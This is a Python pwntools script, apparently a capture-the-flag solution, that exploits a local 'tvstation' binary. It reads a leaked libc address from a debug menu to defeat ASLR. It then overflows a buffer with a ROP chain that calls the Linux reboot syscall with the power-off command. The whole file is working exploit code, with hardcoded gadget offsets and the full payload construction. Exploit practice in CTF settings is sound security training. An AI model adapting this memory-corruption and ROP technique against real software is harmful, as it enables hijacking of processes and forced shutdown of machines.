from pwn import *


context(os="linux", arch="x86_64")

p = process("./bin/tvstation")

# gdb.attach(p,"""
# b debug_func
# c
# """)

# Get to debug menu
p.sendline("4")

# Make sure we capture system address
data = p.recvuntil("[Debug menu] enter cmd: ")

system_addr = int(data.split("system is @")[1].split("\n")[0], 16)

system_offset = 0x41490
libc_base = system_addr - system_offset
# binsh_offset = 0x163708
# binsh_addr = libc_base + binsh_offset

pop_rdi_ret = 0x22482 + libc_base
pop_rax_ret = 0x0000000000038288 + libc_base
pop_rsi_ret = 0x0000000000024125 + libc_base
pop_rdx_ret = 0x0000000000001b8e + libc_base
syscall = 0x00000000000bade5 + libc_base

# padding
payload = ""
payload += "A" * 40

# rax = 169
payload += p64(pop_rax_ret)
payload += p64(169)

# rdi = Magic1
payload += p64(pop_rdi_ret)
payload += p64(0xfee1dead)

# rsi = Magic2
payload += p64(pop_rsi_ret)
payload += p64(672274793)

# rdx = cmd
payload += p64(pop_rdx_ret)
payload += p64(0x4321fedc)

# syscall
payload += p64(syscall)


p.sendline(payload)
p.interactive()
